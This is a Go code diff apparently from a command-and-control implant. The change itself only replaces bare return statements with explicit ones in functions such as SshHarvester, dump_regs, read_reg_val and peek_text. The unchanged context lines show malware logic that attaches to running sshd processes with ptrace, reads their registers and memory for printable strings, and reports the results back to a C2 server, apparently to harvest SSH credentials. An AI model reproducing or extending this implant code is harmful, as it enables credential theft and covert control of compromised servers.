@@ -36,7 +36,7 @@ var (
 func SshHarvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err error) {
 	if SshHarvesterRunning {
 		c2transport.NotifyC2(cmd, "SSH Harvester already running")
-		return
+		return err
 	} else {
 		// initialize context
 		SshHarvesterCtx, SshHarvesterCancel = context.WithCancel(context.Background())
@@ -49,7 +49,7 @@ func SshHarvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err
 	alive, sshd_procs := util.IsProcAlive("sshd")
 	if !alive {
 		c2transport.NotifyC2(cmd, "SSH Harvester (%d): sshd service process not found, aborting", unix.Getpid())
-		return
+		return err
 	}
 
 	c2transport.NotifyC2(cmd, "SSH harvester started (%d) with code pattern set to 0x%x", unix.Getpid(), code_pattern)
@@ -85,7 +85,7 @@ func SshHarvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err
 		util.TakeABlink()
 	}
 
-	return
+	return err
 }
 
 func sshd_harvester(pid int, cmd *cobra.Command, code_pattern []byte, reg_name string) {
@@ -359,7 +359,7 @@ func dump_regs(pid int, cmd *cobra.Command) (regs *unix.PtraceRegs) {
 	err := unix.PtraceGetRegs(pid, regs)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "dump code for %d failed: %v", pid, err)
-		return
+		return regs
 	}
 
 	// dump reg values
@@ -374,7 +374,7 @@ func dump_regs(pid int, cmd *cobra.Command) (regs *unix.PtraceRegs) {
 	rsp := read_reg_val(pid, "RSP", cmd)
 	c2transport.NotifyC2(cmd, "RAX=%s, RDI=%s, RSI=%s, RDX=%s, RCX=%s, R8=%s, R9=%s, RBP=%s, RSP=%s", rax, rdi, rsi, rdx, rcx, r8, r9, rbp, rsp)
 
-	return
+	return regs
 }
 
 // read register value, return printable text or hex string
@@ -383,7 +383,7 @@ func read_reg_val(pid int, reg_name string, cmd *cobra.Command) (val []byte) {
 	err := unix.PtraceGetRegs(pid, regs)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "dump code for %d failed: %v", pid, err)
-		return
+		return val
 	}
 	switch reg_name {
 	case "RAX":
@@ -405,23 +405,23 @@ func read_reg_val(pid int, reg_name string, cmd *cobra.Command) (val []byte) {
 	case "RSP":
 		val = peek_text(pid, uintptr(regs.Rsp), cmd, true)
 	}
-	return
+	return val
 }
 
 // read memory at addr and check if it's printable, 24 bytes at most
 func peek_text(pid int, addr uintptr, cmd *cobra.Command, ensure_printable bool) (read_bytes []byte) {
 	if addr == 0 {
 		c2transport.NotifyC2(cmd, "Invalid address 0x%x", addr)
-		return
+		return read_bytes
 	}
 	read_bytes = make([]byte, 24)
 	_, err := unix.PtracePeekText(pid, addr, read_bytes)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "PEEKTEXT: %v", err)
-		return
+		return read_bytes
 	}
 	if !ensure_printable {
-		return
+		return read_bytes
 	}
 	if util.AreBytesPrintable(read_bytes) {
 		// we only want the string, remove everything after the first null byte
